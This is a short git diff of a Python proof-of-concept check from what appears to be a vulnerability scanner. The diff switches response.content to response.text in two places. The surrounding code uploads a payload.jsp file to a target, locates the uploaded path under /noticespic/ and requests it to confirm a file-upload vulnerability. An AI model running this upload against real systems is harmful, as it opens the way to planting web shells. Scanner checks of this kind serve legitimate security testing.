@@ -67,7 +67,7 @@ class Poc(ABPoc):
 
             files = {'file': ('payload.jsp', file_v_jsp, 'text/plain')}
             response = requests.post(target_url, files=files)  # 上传
-            content = response.content
+            content = response.text
 
             regular = re.compile('/noticespic/.*jsp')
             url_back = regular.findall(content)
@@ -76,7 +76,7 @@ class Poc(ABPoc):
                 verify_url = verify_url+url_back[0]
                 time.sleep(5)  # 不加会出错哦，可能是上一个上传还没完成，就去请求的时候导致数据出错了
                 req = requests.get(verify_url)
-                content = req.content
+                content = req.text
                 if '0a12184d25062e5f' in content:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
